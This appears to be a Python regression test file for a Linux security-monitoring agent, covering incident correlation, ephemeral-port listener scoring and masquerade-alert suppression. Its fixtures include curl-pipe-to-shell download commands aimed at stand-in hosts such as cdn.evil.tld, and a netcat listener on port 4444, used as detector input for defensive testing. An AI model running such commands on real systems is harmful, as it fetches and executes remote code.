#!/usr/bin/env python3
"""Regression tests for the 2026-10-22 investigation-storm fixes (Linux agent).

See the macOS copy for the full write-up. The three root causes, pinned here:

  1. The correlator re-identified an incident by its member node ids, which are ephemeral by
     construction (`proc:<pid>` dies each exec; `listen:...:<port>` rotates every snapshot), so a
     recurring cluster minted a new investigation every cycle. Identity now comes from the stable
     correlation keys (root process / hash / IP / URL / run payload / path).
  2. A 0.0.0.0 listener on an ephemeral/dynamic port (>=49152) scored a full network-reachable alert.
     It is now informational (weight 0).
  3. argv[0] != executable fired T1036 on binaries that ship in an installed package (trusted) and
     legitimately set their own argv[0]. It is now only a signal on untrusted (unpackaged / modified
     / missing) binaries.

Pure stdlib. Run from the linux/ dir:  python3 -m unittest discover -s tests -v
"""
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import agent  # noqa: E402


def exec_alert(nid, cmdline, severity="high", mitre=("T1059.004",)):
    return {"id": nid, "type": "process", "label": "x", "severity": severity, "score": 70,
            "reasons": [{"text": "t", "mitre": m} for m in mitre],
            "detail": {"cmdline": cmdline, "exe": "/bin/sh", "hashes": {"status": "n/a"}},
            "triage": {"status": "open"}}


def clusters_of(nodes, proc_parent=None):
    return agent.correlate_incidents(nodes, {n["id"]: n for n in nodes}, [], proc_parent or {})


class TestStableIncidentIdentity(unittest.TestCase):
    def test_same_tie_different_member_ids_share_one_sig(self):
        url = "http://cdn.evil.tld/stage2.sh"
        s1 = clusters_of([exec_alert("exec:%d:1" % i, "/bin/sh -c curl -fsSL %s | sh" % url)
                          for i in (1, 2, 3)])
        s2 = clusters_of([exec_alert("exec:%d:1" % i, "/bin/sh -c curl -fsSL %s | sh" % url)
                          for i in (7, 8, 9)])
        self.assertEqual(len(s1), 1)
        self.assertEqual(len(s2), 1)
        self.assertEqual(s1[0]["sig"], s2[0]["sig"])
        self.assertNotEqual(set(s1[0]["members"]), set(s2[0]["members"]))

    def test_distinct_clusters_get_distinct_sigs(self):
        a = clusters_of([exec_alert("exec:%d:1" % i, "/bin/sh -c curl http://a.tld/x | sh")
                         for i in (1, 2)])
        b = clusters_of([exec_alert("exec:%d:1" % i, "/bin/sh -c curl http://b.tld/x | sh")
                         for i in (1, 2)])
        self.assertNotEqual(a[0]["sig"], b[0]["sig"])


class TestReconcileDoesNotMultiply(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="scouter-storm-")
        self.store = agent.IncidentStore(path=os.path.join(self.tmp, "incidents.json"))

    def _snapshot(self, ids):
        url = "http://cdn.evil.tld/stage2.sh"
        nodes = [exec_alert("exec:%d:1" % i, "/bin/sh -c curl -fsSL %s | sh" % url) for i in ids]
        clusters = [c for c in clusters_of(nodes) if c["size"] >= 2]
        self.store.reconcile(clusters)

    def test_churning_member_ids_stay_one_investigation(self):
        self._snapshot((1, 2, 3))
        self._snapshot((4, 5, 6))
        self._snapshot((7, 8, 9))
        self.assertEqual(len(self.store.list()), 1)

    def test_a_closed_churning_cluster_stays_closed(self):
        self._snapshot((1, 2, 3))
        iid = self.store.list()[0]["id"]
        self.store.set_status(iid, "closed", substatus="Benign")
        self._snapshot((4, 5, 6))
        lst = self.store.list()
        self.assertEqual(len(lst), 1)
        self.assertEqual(lst[0]["status"], "closed")


class TestEphemeralListenerNotAnAlert(unittest.TestCase):
    def test_dynamic_port_listener_scores_zero(self):
        sc, reasons, kind = agent.score_connection(
            {"state": "LISTEN", "laddr": "*", "lport": "59876", "proto": "TCP"}, "some-helper")
        self.assertEqual(kind, "listen")
        self.assertEqual(sc, 0)
        self.assertTrue(any("ephemeral" in r["text"] for r in reasons))

    def test_service_port_listener_still_alerts(self):
        sc, reasons, _ = agent.score_connection(
            {"state": "LISTEN", "laddr": "0.0.0.0", "lport": "4444", "proto": "TCP"}, "nc")
        self.assertEqual(sc, 40)
        self.assertTrue(any("reachable from the network" in r["text"] for r in reasons))


class TestTrustedBinaryMasqueradeSuppressed(unittest.TestCase):
    def _masq_reasons(self, sig):
        p = {"exe": "/opt/google/chrome/GoogleUpdater", "cmdline": "Application --check"}
        _, reasons = agent.score_process(p, sig, [], [])
        return [r for r in reasons if "differs from executable" in r["text"]]

    def test_packaged_trusted_binary_is_not_flagged(self):
        self.assertEqual(self._masq_reasons({"category": "packaged", "trusted": True}), [])

    def test_unpackaged_binary_still_flagged(self):
        self.assertTrue(self._masq_reasons({"category": "unpackaged", "trusted": False}))

    def test_modified_package_binary_still_flagged(self):
        self.assertTrue(self._masq_reasons({"category": "modified", "trusted": False}))


if __name__ == "__main__":
    unittest.main(verbosity=2)
